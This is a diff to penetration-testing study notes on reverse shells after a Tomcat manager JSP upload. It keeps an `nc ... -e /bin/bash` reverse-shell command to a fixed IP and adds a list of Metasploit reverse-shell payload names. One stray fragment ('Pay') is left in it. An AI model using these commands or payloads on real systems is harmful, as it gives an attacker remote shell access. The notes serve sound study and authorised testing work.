@@ -449,12 +449,7 @@ Tomcat Web Manager (JSP reverse shell upload)
 Reverse shell tips:
 * If a standard reverse-shell such as `nc 10.11.0.222 4444 -e /bin/bash` doesn't work, use `exploit/multi/handler` to catch the connection.
 
-Reverse shell cheatsheet:
-* http://blog.safebuff.com/2016/06/19/Reverse-shell-Cheat-Sheet/
-
-Metasploit reverse shell payloads:
-* http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/
-* https://netsec.ws/?p=331
+Pay
 
 __##################### WARNING: METERPRETER PAYLOADS ARE RESTRICTED ####################__  
 Meterpreter reverse-shell + usage:
@@ -483,6 +478,11 @@ meterpreter > migrate 1548
 
 __##################### WARNING: METERPRETER PAYLOADS ARE RESTRICTED ####################__  
 
+Payload not working?
+* Try another one.
+* `/meterpreter/reverse_tcp`
+* `/shell/reverse_tcp`
+* `/vncinject/reverse_tcp`
 
 Payload size is restricted?
 * Look for a payload that has a smaller size than standard e.g. `reverse_nonx_tcp`.
